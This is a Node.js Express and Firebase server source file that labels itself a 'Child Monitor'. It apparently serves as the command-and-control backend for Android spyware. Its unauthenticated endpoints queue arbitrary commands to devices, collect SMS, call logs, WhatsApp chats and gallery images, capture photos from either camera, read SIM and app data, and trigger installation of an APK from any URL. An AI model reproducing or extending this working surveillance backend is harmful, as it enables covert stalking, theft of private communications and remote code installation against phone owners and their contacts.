const express = require('express');
const admin = require('firebase-admin');
const app = express();
const PORT = process.env.PORT || 3000;

// ================== Firebase Initialization ==================
const serviceAccount = require('./serviceAccountKey.json'); // Ensure this file exists
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com' // Replace with your DB URL
});

const db = admin.database();
app.use(express.json({ limit: '50mb' })); // For base64 images

// ================== Helper: Wait for Response from Device ==================
async function waitForResponse(deviceId, requestType, requestId, timeout = 15000) {
  const responseRef = db.ref(`responses/${deviceId}/${requestType}`);
  return new Promise((resolve, reject) => {
    let responded = false;
    const listener = responseRef.on('value', (snapshot) => {
      if (!responded && snapshot.exists()) {
        const data = snapshot.val();
        if (data.requestId === requestId) {
          responded = true;
          clearTimeout(timer);
          responseRef.off('value', listener);
          responseRef.remove(); // Clean up
          resolve(data);
        }
      }
    });
    const timer = setTimeout(() => {
      if (!responded) {
        responded = true;
        responseRef.off('value', listener);
        reject(new Error('Timeout waiting for device response'));
      }
    }, timeout);
  });
}

// ================== Device Registration & Status ==================
app.post('/api/register', async (req, res) => {
  const { deviceId, info } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });

  try {
    const deviceRef = db.ref(`onlineDevices/${deviceId}`);
    await deviceRef.set({
      info: info || {},
      lastSeen: admin.database.ServerValue.TIMESTAMP,
      online: true
    });
    res.json({ status: 'registered', deviceId });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/devices', async (req, res) => {
  try {
    const snapshot = await db.ref('onlineDevices').once('value');
    const devices = [];
    const now = Date.now();
    snapshot.forEach(child => {
      const device = child.val();
      if (now - device.lastSeen < 60000) { // Online within last minute
        devices.push({
          deviceId: child.key,
          info: device.info,
          lastSeen: device.lastSeen
        });
      } else {
        child.ref.update({ online: false });
      }
    });
    res.json(devices);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== Send Command ==================
app.post('/api/command', async (req, res) => {
  const { deviceId, command } = req.body;
  if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });

  try {
    const commandsRef = db.ref(`commands/${deviceId}`);
    const newCommandRef = await commandsRef.push({
      command,
      timestamp: admin.database.ServerValue.TIMESTAMP,
      status: 'pending'
    });
    res.json({ status: 'queued', deviceId, command, key: newCommandRef.key });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== SMS ==================
app.get('/api/sms/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();
  try {
    // Write request to Firebase
    await db.ref(`requests/${deviceId}/sms`).set({ requestId, timestamp: admin.database.ServerValue.TIMESTAMP });
    // Wait for response
    const response = await waitForResponse(deviceId, 'sms', requestId, 10000);
    res.json(response.smsList || []);
  } catch (error) {
    res.status(408).json({ error: error.message });
  }
});

// ================== Calls ==================
app.get('/api/calls/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/calls`).set({ requestId, timestamp: admin.database.ServerValue.TIMESTAMP });
    const response = await waitForResponse(deviceId, 'calls', requestId, 10000);
    res.json(response.callList || []);
  } catch (error) {
    res.status(408).json({ error: error.message });
  }
});

// ================== Photo Capture ==================
app.get('/api/photo/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const camera = req.query.camera || 'back'; // 'front' or 'back'
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/photo`).set({ requestId, camera, timestamp: admin.database.ServerValue.TIMESTAMP });
    const response = await waitForResponse(deviceId, 'photo', requestId, 15000);
    res.json({ imageBase64: response.imageBase64, timestamp: response.timestamp });
  } catch (error) {
    res.status(408).json({ error: error.message });
  }
});

// ================== Gallery Images ==================
app.get('/api/gallery/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/gallery`).set({ requestId, timestamp: admin.database.ServerValue.TIMESTAMP });
    const response = await waitForResponse(deviceId, 'gallery', requestId, 15000);
    res.json(response.images || []);
  } catch (error) {
    res.status(408).json({ error: error.message });
  }
});

// ================== WhatsApp Chats ==================
app.get('/api/whatsapp/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/whatsapp`).set({ requestId, timestamp: admin.database.ServerValue.TIMESTAMP });
    const response = await waitForResponse(deviceId, 'whatsapp', requestId, 10000);
    res.json(response.chats || []);
  } catch (error) {
    res.status(408).json({ error: error.message });
  }
});

// ================== Installed Apps ==================
app.get('/api/installedApps/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/installedApps`).set({ requestId, timestamp: admin.database.ServerValue.TIMESTAMP });
    const response = await waitForResponse(deviceId, 'installedApps', requestId, 10000);
    res.json(response.apps || []);
  } catch (error) {
    res.status(408).json({ error: error.message });
  }
});

// ================== SIM Info ==================
app.get('/api/simInfo/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/simInfo`).set({ requestId, timestamp: admin.database.ServerValue.TIMESTAMP });
    const response = await waitForResponse(deviceId, 'simInfo', requestId, 10000);
    res.json(response.simList || []);
  } catch (error) {
    res.status(408).json({ error: error.message });
  }
});

// ================== Install APK ==================
app.post('/api/installApk', async (req, res) => {
  const { deviceId, url } = req.body;
  if (!deviceId || !url) return res.status(400).json({ error: 'deviceId and url required' });

  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/installApk`).set({ requestId, url, timestamp: admin.database.ServerValue.TIMESTAMP });
    const response = await waitForResponse(deviceId, 'installApk', requestId, 30000); // Longer timeout for download
    res.json({ result: response.result });
  } catch (error) {
    res.status(408).json({ error: error.message });
  }
});

// ================== Notifications (for fetching recent) ==================
app.get('/api/notifications/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const limit = parseInt(req.query.limit) || 20;
  try {
    const snapshot = await db.ref(`notifications/${deviceId}`).orderByKey().limitToLast(limit).once('value');
    const notifs = [];
    snapshot.forEach(child => {
      notifs.push({ id: child.key, ...child.val() });
    });
    res.json(notifs.reverse()); // Latest first
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== Post Notification (from device) ==================
app.post('/api/notification', async (req, res) => {
  const { deviceId, packageName, title, text, timestamp } = req.body;
  if (!deviceId || !packageName) return res.status(400).json({ error: 'Missing data' });

  try {
    const notifRef = db.ref(`notifications/${deviceId}`).push();
    await notifRef.set({
      packageName,
      title: title || '',
      text: text || '',
      timestamp: timestamp || admin.database.ServerValue.TIMESTAMP
    });
    res.json({ status: 'logged' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== App Usage ==================
app.post('/api/usage', async (req, res) => {
  const { deviceId, packageName, appName, timestamp } = req.body;
  if (!deviceId || !packageName) return res.status(400).json({ error: 'Missing data' });

  try {
    const usageRef = db.ref(`usage/${deviceId}`).push();
    await usageRef.set({
      packageName,
      appName: appName || packageName,
      timestamp: timestamp || admin.database.ServerValue.TIMESTAMP
    });
    res.json({ status: 'logged' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/usage/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const limit = parseInt(req.query.limit) || 20;
  try {
    const snapshot = await db.ref(`usage/${deviceId}`).orderByKey().limitToLast(limit).once('value');
    const usage = [];
    snapshot.forEach(child => {
      usage.push({ id: child.key, ...child.val() });
    });
    res.json(usage.reverse());
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== Battery ==================
app.post('/api/battery', async (req, res) => {
  const { deviceId, level, charging, timestamp } = req.body;
  if (!deviceId || level == null) return res.status(400).json({ error: 'Missing data' });

  try {
    const batteryRef = db.ref(`battery/${deviceId}`).push();
    await batteryRef.set({
      level,
      charging: charging || false,
      timestamp: timestamp || admin.database.ServerValue.TIMESTAMP
    });
    res.json({ status: 'logged' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/battery/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  try {
    const snapshot = await db.ref(`battery/${deviceId}`).orderByKey().limitToLast(1).once('value');
    let latest = null;
    snapshot.forEach(child => {
      latest = { id: child.key, ...child.val() };
    });
    res.json(latest);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================== Root ==================
app.get('/', (req, res) => {
  res.send('Firebase Server for Child Monitor is running.');
});

// ================== Start Server ==================
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});